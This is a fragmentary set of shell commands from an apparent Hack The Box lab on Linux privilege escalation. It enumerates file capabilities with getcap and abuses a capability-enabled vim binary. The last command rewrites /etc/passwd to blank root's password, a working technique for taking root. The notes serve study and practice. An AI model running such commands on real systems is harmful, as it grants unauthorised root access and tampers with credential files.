...
```shell-session
premjampuram@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
...
```shell-session
premjampuram@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
...
```shell-session
premjampuram@htb[/htb]$ getcap /usr/bin/vim.basic
...
```shell-session
premjampuram@htb[/htb]$ cat /etc/passwd | head -n1
...
```shell-session
premjampuram@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```
...
```shell-session
premjampuram@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
premjampuram@htb[/htb]$ cat /etc/passwd | head -n1
